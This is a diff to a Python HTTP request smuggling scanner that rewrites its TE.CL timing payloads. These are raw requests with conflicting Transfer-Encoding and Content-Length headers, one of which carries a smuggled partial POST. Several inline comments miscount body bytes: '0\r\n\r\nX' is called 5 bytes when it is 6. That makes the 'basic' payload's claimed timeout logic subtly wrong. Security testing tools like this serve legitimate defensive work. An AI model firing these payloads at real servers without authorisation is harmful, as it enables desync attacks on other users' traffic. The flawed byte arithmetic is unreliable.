@@ -73,18 +73,93 @@ class TECLPayloadGenerator(PayloadGenerator):
     
     def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
         """Generate TE.CL timing-based detection payloads.
-        
+
         These payloads cause a timeout if the backend uses Content-Length
         but we send chunked data that extends beyond CL bytes.
         """
         host, path = self._extract_host_path(endpoint)
         payloads = []
-        
-        # Basic TE.CL timing payload
-        # Frontend sees complete chunked message
-        # Backend sees CL=4, reads "5c\r\n", then waits for request line
-        # The "5c" (hex 92) is interpreted as start of next request
+
+        # TE.CL timing per TryHackMe specification
+        # Frontend sees complete chunked message: "0\r\n" + "X" terminates
+        # Backend sees CL=6, tries to read 6 bytes from body: "0\r\n\r\nX" is only 5 bytes
+        # Backend hangs waiting for the 6th byte
         payload1 = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Content-Length: 6\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+            f"X"  # Body is "0\r\n\r\nX" = 5 bytes, but CL says 6. Backend waits.
+        )
+
+        payloads.append(Payload(
+            name="TE.CL-timing-basic",
+            variant=self.variant,
+            category=PayloadCategory.TIMING,
+            raw_request=payload1.encode(),
+            description="TE.CL timing: CL=6 but body is 5 bytes, backend waits",
+            detection_method=DetectionMethod.TIMING,
+            expected_behavior="Backend reads CL bytes, waits for 1 more byte",
+            expected_timeout=5.0,
+        ))
+
+        # TE.CL alternative: larger CL mismatch
+        # Body sent: "0\r\n\r\n" = 5 bytes, CL says 10 - backend waits for 5 more
+        payload2 = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Content-Length: 10\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+        )
+
+        payloads.append(Payload(
+            name="TE.CL-timing-cl10",
+            variant=self.variant,
+            category=PayloadCategory.TIMING,
+            raw_request=payload2.encode(),
+            description="TE.CL timing: CL=10 but body is 5 bytes",
+            detection_method=DetectionMethod.TIMING,
+            expected_behavior="Backend waits for 5 more bytes that never arrive",
+            expected_timeout=5.0,
+        ))
+
+        # TE.CL with CL=4 - minimal mismatch
+        # Frontend sees complete chunked body, backend needs 4 bytes but gets "0\r\n" (3)
+        payload3 = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Content-Length: 4\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+        )
+
+        payloads.append(Payload(
+            name="TE.CL-timing-cl4",
+            variant=self.variant,
+            category=PayloadCategory.TIMING,
+            raw_request=payload3.encode(),
+            description="TE.CL with CL=4, body is 3 bytes",
+            detection_method=DetectionMethod.TIMING,
+            expected_behavior="Backend waits for 1 more byte",
+            expected_timeout=5.0,
+        ))
+
+        # TE.CL with smuggled partial request causing timeout
+        # Frontend processes complete chunk, backend sees partial HTTP request
+        payload4 = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -92,8 +167,8 @@ class TECLPayloadGenerator(PayloadGenerator):
             f"Content-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
-            f"5c\r\n"  # Chunk size (92 bytes - but we only send a few)
-            f"GPOST / HTTP/1.1\r\n"
+            f"5e\r\n"
+            f"POST / HTTP/1.1\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: 15\r\n"
             f"\r\n"
@@ -101,72 +176,18 @@ class TECLPayloadGenerator(PayloadGenerator):
             f"0\r\n"
             f"\r\n"
         )
-        
+
         payloads.append(Payload(
-            name="TE.CL-timing-basic",
+            name="TE.CL-timing-partial",
             variant=self.variant,
             category=PayloadCategory.TIMING,
-            raw_request=payload1.encode(),
-            description="Basic TE.CL timing payload",
+            raw_request=payload4.encode(),
+            description="TE.CL timing with partial smuggled request",
             detection_method=DetectionMethod.TIMING,
-            expected_behavior="Backend reads CL bytes, sees partial request, waits",
+            expected_behavior="Backend sees partial request, waits for completion",
             expected_timeout=5.0,
         ))
-        
-        # TE.CL with small Content-Length
-        # Backend only reads 0 bytes, everything after headers is smuggled
-        body2 = (
-            f"1\r\n"
-            f"X\r\n"
-            f"0\r\n"
-            f"\r\n"
-        )
-        payload2 = (
-            f"POST {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Content-Type: application/x-www-form-urlencoded\r\n"
-            f"Connection: keep-alive\r\n"
-            f"Content-Length: 0\r\n"
-            f"Transfer-Encoding: chunked\r\n"
-            f"\r\n"
-            f"{body2}"
-        )
-        
-        payloads.append(Payload(
-            name="TE.CL-timing-zero-cl",
-            variant=self.variant,
-            category=PayloadCategory.TIMING,
-            raw_request=payload2.encode(),
-            description="TE.CL with Content-Length: 0",
-            detection_method=DetectionMethod.TIMING,
-            expected_behavior="Backend reads 0 bytes, chunked data left in buffer",
-            expected_timeout=5.0,
-        ))
-        
-        # TE.CL where CL doesn't match first line of chunk
-        payload3 = (
-            f"POST {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Connection: keep-alive\r\n"
-            f"Content-Length: 6\r\n"
-            f"Transfer-Encoding: chunked\r\n"
-            f"\r\n"
-            f"0\r\n"
-            f"\r\n"
-            f"X"  # This extra byte is in chunked but not CL
-        )
-        
-        payloads.append(Payload(
-            name="TE.CL-timing-cl-mismatch",
-            variant=self.variant,
-            category=PayloadCategory.TIMING,
-            raw_request=payload3.encode(),
-            description="TE.CL with CL slightly larger than terminator",
-            detection_method=DetectionMethod.TIMING,
-            expected_behavior="Backend tries to read 6 bytes including next request",
-            expected_timeout=5.0,
-        ))
-        
+
         return payloads
     
     def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
